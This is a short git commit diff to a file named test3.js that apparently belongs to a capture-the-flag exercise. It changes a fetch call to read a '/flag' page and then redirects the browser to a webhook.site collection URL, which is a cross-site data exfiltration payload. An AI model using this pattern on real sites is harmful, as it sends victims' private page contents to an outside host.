36cf352ae0666ef87c14af2ce865362acfbbcc53
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:08:12 +0700

    s

--- test3.js
+++ test3.js
@@ -1,4 +1,4 @@
-fetch('https://google.com').then((res) => {
+fetch('/flag').then((res) => {
     res.text().then((test) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/`;
     }).catch((owo) => {
